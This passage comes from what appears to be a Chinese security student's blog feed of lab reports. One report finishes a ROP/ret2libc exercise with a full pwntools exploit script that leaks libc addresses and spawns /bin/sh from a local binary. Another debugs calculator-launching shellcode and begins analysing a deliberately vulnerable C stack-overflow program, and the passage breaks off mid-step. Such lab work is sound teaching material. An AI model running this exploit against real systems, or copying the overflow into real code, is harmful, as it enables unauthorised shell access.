668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mn" transform="translate(939,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(1939,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(2468,0)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g><g data-mml-node="mi" transform="translate(2968,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(3488,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(4017,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(4517,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(4939,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(12734.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(13790.2,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path></g><g data-mml-node="mi" transform="translate(1889,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mn" transform="translate(2322,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><g data-mml-node="mi" transform="translate(2822,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(3251,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(3673,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> ROP 所需要的东西都齐备了。</p>
</li>
<li>
<p>但是在实际 getshell 的过程中，我们需要以脚本的方式来自动化完成泄露地址 -&gt; 寻找相对差值 -&gt; 写 shellcode 的过程，所以需要 pwn 库的一些额外功能。由于只有在程序运行时，才会加载系统库，所以需要预先发送一个 payload，此 payload 用于泄露地址，计算出 <code>/bin/sh</code> 的相对位移后，第二步的 payload 才会 “击中要害”。</p>
</li>
<li>
<p>Pwn 的 ELF 模块用于获取 ELF 文件的信息，用法是 <code>elf=ELF('sofile_name')</code>，我们要在这里拿 <code>write</code> 函数的 got 表和 plt 表地址，可以直接用 <code>elf.got["write"]</code>，<code>elf.plt["write"]</code> 获得，至于寻找 <code>/bin/sh</code> 字符串，可以用 <code>next(elf.search('/bin/sh'))</code> 获得。</p>
</li>
<li>
<p>最终 payload 代码如下</p>
 <figure class="highlight python"><figcaption><span>payload2.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">'./rop2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b vuln')</span></span><br><span class="line">write_got = <span class="number">0x804a014</span> write_plt = <span class="number">0x8048320</span> vuln_addr = <span class="number">0x804843b</span></span><br><span class="line">log.info(<span class="string">'leaking addr from write got&amp;plt'</span>)</span><br><span class="line">rop1 = p32(write_plt)+p32(vuln_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x8c</span> + rop1 p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">sys_addr = write_addr - (libc.symbols[<span class="string">'write'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>]-<span class="built_in">next</span>(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'write_addr:%#x'</span>%write_addr)</span><br><span class="line">log.info(<span class="string">'write in libc.symbols:%#x'</span>%libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">log.info(<span class="string">'system in libc.symbols:%#x'</span>%libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">log.info(<span class="string">'/bin/sh absolute addr:%#x'</span>%<span class="built_in">next</span>(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span>%sys_addr)</span><br><span class="line">log.info(<span class="string">'binsh_addr:%#x'</span>%binsh_addr)</span><br><span class="line">log.info(<span class="string">'sending final payload'</span>)</span><br><span class="line">rop2 = p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x8c</span>+rop2</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
<p>其中第一步先向 <code>vuln_addr</code> 写入 <code>write</code> 函数的地址，以获得泄露的 <code>write</code> 函数绝对地址。然后，根据系统库的相对偏移计算出 <code>/bin/sh</code> 的地址，最终的 payload 是填充 <code>0x8c个字符"a"+sys_addr+sys_addr的返回地址（随意指定一个不存在的值）+binsh_addr</code>。观察上述脚本，我还发现，<code>/bin/sh</code> 的地址其实可以直接用 <code>write</code> 和 <code>/bin/sh</code> 的相对差值来算，不需要再单独算出 <code>sys_addr</code>。</p>
</li>
</ol>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-7.png" class="" title="Getshell成功截图">
<h2 id="实验难点及收获">实验难点及收获</h2>
<p>本次实验的难点和最大的收获都在于 payload 的构造方法。这次通过两个实验，了解到了利用 ROP 技术绕过 NX 和 ASLR 保护的方法，了解到 shellcode <code>system("/bin/sh")</code> 在此时的一般构造格式为<code>溢出填充字符+p32(sys_addr)+p32(system的返回地址，一般指定一个不存在的地址)+p32(binsh_addr)</code>，<code>sys_addr</code> 可以在 ASLR 关闭的情况下直接 gdb 调试观察，或者在 ASLR 开启时通过泄露 libc 某函数的地址，算出相对差值以获得。</p>
<p>本次实验所使用的程序都是 32 位程序，实际上还有很多 64 位程序会用到相似的思路，不过 64 位程序需要借助 gadget，这是以后要进一步学习的内容了。</p>
<h2 id="实验思考">实验思考</h2>
<p>问题：为什么明明 pwndbg 和 gdb-peda 对于 vmmap 中 libc-2.23.so 的起始终止地址输出均相同，但是在 gdb-peda 中找不到 <code>/bin/sh</code> 呢？</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1%E5%9D%91%E7%82%B9.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-4.png" class=""></div></div></div>
]]></content>
      <categories>
        <category>实验</category>
        <category>漏洞分析</category>
        <category>漏洞</category>
        <category>缓冲区溢出</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制漏洞</title>
    <url>/2019/10/07/experiments/security/vulnerability_analysis/shellcode/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>了解二进制漏洞的基本原理，应用简单的调试技术调试 shellcode 程序，理解 shellcode 如何执行。</p>
<span id="more"></span>
<div class="note info"><p>本次实验 2.1~2.2 部分所使用的环境为 Windows XP SP2，调试软件为 Ollydbg。2.3 部分所使用的环境为 Ubuntu16.04LTS，调试软件为 gdb。</p>
</div>
<h2 id="步骤">步骤</h2>
<h3 id="初见shellcode程序">初见 shellcode 程序</h3>
<p>首先，利用 SCer.exe 启动给定的 <code>sc2.bin</code>，将 <code>sc2.bin</code> 拖入对话框中，然后点击 “执行 Shellcode”，便会弹出计算器。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/0.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/2.png" class=""></div></div></div>
<h3 id="调试shellcode程序">调试 shellcode 程序</h3>
<ol>
<li>
<p>把原来的 <code>sc2.bin</code> 拖入 <code>SCer.exe</code>，然后点击 “转成字符串”，即可得到下方所示文件</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/3.png" class="">
<p>在 shellcode 最前方加入 <code>\xcc</code>（对应的汇编指令为 <code>int 3</code>，该指令是系统的中断指令），然后重新转为 <code>bin</code> 文件，把生成的<code>.mybin</code> 后缀名改掉，将其重新拖入对话框中。</p>
</li>
<li>
<p>先不要点击 “执行 Shellcode”，打开 Ollydbg，选择 “附加进程”，找到 SCer 进程，点击 “附加”。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/4.png" class="" title="附加进程">
<p>再点击 “执行 Shellcode”，注意程序输出的状态值。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/5.png" class="" title="继续执行shellcode">
</li>
<li>
<p>程序运行到 <code>0xe00000</code> 时暂停。那个位置刚好是我们刚打下的断点。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/6.png" class="">
</li>
<li>
<p>所有的 shellcode 大概就是这样的，下图是全览。接下来将逐步解析。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/7.png" class="">
</li>
<li>
<p>跟随程序流，我们找到 <code>0xe00057</code> 的 push 语句，紧接着，它调用了函数 <code>0xe00003</code>，跟入函数进去看看。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/8.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/9.png" class=""></div></div></div>
</li>
<li>
<p>接着，程序向 ESI 寄存器写入了寄存器 DS 的值的偏移，此过程迭代了 2 次，EBX 寄存器也被写了 EBP 的值的偏移，也迭代了 2 次。中间还注意到了 ntdll 的接口。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/10.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/11.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/12.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/13.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/14.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/15.png" class=""></div></div></div>
</li>
<li>
<p>下面是一个循环，不断把 <code>ES:[EDI]</code> 中的内容移入 EDX 中。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/16.png" class="">
</li>
<li>
<p>循环执行结束后执行到 <code>0xe0004e</code> 处，此时注意到 EDI 被写入了 <code>kernel32.7c808c5d</code> 的内容，有一个类似于 <code>WriteConsoleA</code> 的东西，猜想刚才的过程可能是为了寻找系统 api 的地址，然后把地址作为参数开启后续调用。这个函数执行完后就 return 回去了。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/17.png" class=""> <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/18.png" class="">
</li>
<li>
<p>接下来是一个重头戏，在 <code>0xe00062</code> 处，push 了一个 "calc" 字符串，然后将其移动到 EDX 寄存器上。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/19.png" class="">
</li>
<li>
<p>然后，过了几步后，程序把寄存器 EBP 上的内容视为函数并调用了它，观察到此时 EBP 的内容为 <code>kernel32.WinExec</code> 的地址，结合前面推入的 <code>calc</code> 参数，推测此时准备开始执行了计算器。跟入 <code>WinExec</code>，可以看到 <code>CreateProcessInternalA</code> 函数，创建了一个新进程。</p>
<img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/20-1.png" class="">
</li>
<li>
<p>此时的堆栈状态如下</p>
<img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/20-2.png" class="">
<img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/20-3.png" class="">
</li>
<li>
<p>接下来还有一组 <code>PUSH-CALL 函数-PUSH EAX-CALL EBP</code> 操作。可以看到，这次操作最终使得 <code>kernel32.ExitProcess</code> 被调用。推测是为了杀掉 SCer 进程。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/23-ex.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/23-ex2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/21.png" class=""></div></div></div>
</li>
<li>
<p>接下来就调试不下去了，程序已经陷入持续的访问违规当中了。但是留下那个计算器窗口已经完成了 shellcode 所给的任务了 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/22.png" class=""></p>
</li>
</ol>
<h3 id="给定程序漏洞分析和利用">给定程序漏洞分析和利用</h3>
<p>这次的漏洞程序给了源码，光直接阅读源码，就可以获得很多信息。</p>
<p>程序流程简单，从 <code>main</code> 函数开始，只经历了两个函数 <code>init</code> 和 <code>bof</code>，而 <code>init</code> 函数中，只是简单初始化了缓冲区和调用 <code>alarm()</code>，剩下给我们的只有 <code>bof</code> 函数了。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	init();</span><br><span class="line">	bof();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">	alarm(alarm_time);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>从源码的 Description 注释中，我们观察到，这次要利用的漏洞为栈溢出漏洞，我们需要使用栈溢出方法，在栈上执行 shellcode。</p>
<p>我们的目标是 <code>egg()</code> 函数，可以看到无论在哪个函数中，该函数都没有执行，我们需要想办法将程序的执行流程导向到 <code>egg</code> 函数中，来实现一个溢出的目的。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">egg</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	__asm__ (<span class="string">"jmp *-0x30(%rsp);"</span>);</span><br><span class="line">	<span class="comment">//__asm__("sub rsp,0x30;jmp rsp;");</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后是本地实验最重要的分析目标 <code>bof</code> 函数，其中规定了一个 48 字节长的 <code>char</code> 数组作为缓冲区，然后将 60 字节的内容读入缓冲区 <code>content</code> 中，在这个过程中，其实已经产生了漏洞点，当我们输入的内容大于等于 48 字节时，就可能会产生缓冲区溢出漏洞。但是，程序随后执行 <code>strlen</code> 函数进行一步检查，我们输入的内容大于等于 48 字节时，会触发提示 "Detect bof"，使得程序退出。越过了这一层检查，还有一层检查是用来过滤坏字符的，这一步的过滤比较轻，只检查了 "0xaa" 和 "0xbb" 两种字符。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bof</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">char</span> content[<span class="number">48</span>]={<span class="number">0</span>};</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Input your content: "</span>);</span><br><span class="line">	read(<span class="number">0</span>,content,<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(content)&gt;=<span class="number">48</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Detect bof!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span>(!check_input(content))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_input</span><span class="params">(<span class="type">char</span> *ss)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">char</span> filter[<span class="number">8</span>] = {<span class="string">'\xaa'</span>,<span class="string">'\xbb'</span>};</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filter_num;i++)</span><br><span class="line">	{</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(ss);j++)</span><br><span class="line">		{</span><br><span class="line">			<span class="keyword">if</span>(ss[j]==filter[i])</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>能不能绕过所有错误提示，顺利触发程序的溢出点，进入到 <code>egg</code> 函数中呢？</p>
<ol>
<li>
<p>先运行一遍程序，直观感受程序流程。 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/24.png" class=""></p>
<ul>
<li>输入较少字数的 content 时，程序无错退出，但这不是我们本次练习的目标。</li>
<li>当 content 输入字数增加时，会看到 "Detect bof!" 的提示，能明显看到，后面又多出了几个 "f" 的输入，这大概就是输入溢出的体现了。（因为后面溢出的字符被当成命令执行了）</li>
</ul>
</li>
<li>
<p>用 gdb 打开这个可执行程序，然后使用 <code>checksec</code> 检查程序的保护。 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/25.png" class=""> <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/26.png" class="" title="checksec检查结果"></p>
 <div class="note info"><p>检查结果是没有开启任何保护，有可写可读可执行段，是我们漏洞利用的前提。</p>
</div>
</li>
<li>
<p>先在几个函数下断点。我选择 <code>egg</code>、<code>bof</code> 和 <code>check_input</code> 三个函数下打上断点。</p>
</li>
<li>
<p>执行 <code>b</code> 命令时可以看到断点的地址。大概判断 <code>egg</code> 函数的地址在 <code>0x40079c</code> 处，<code>bof</code> 在 <code>0x40082e</code> 处，<code>check_input</code> 在 <code>0x4007a9</code> 处。 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/27.png" class=""></p>
</li>
<li>
<p><code>disassemble</code> 命令看一下 <code>egg</code> 函数的汇编，左侧显示 <code>egg</code> 函数的头部在 <code>0x400798</code> 处，恰好对应于上图的 <code>0x40079c-4</code> 处。<img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/28.png" class=""></p>
</li>
<li>
<p>按下<kbd> r</kbd> 键开始运行程序，程序停在了输入点中。 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/29.png" class=""></p>
</li>
<li>
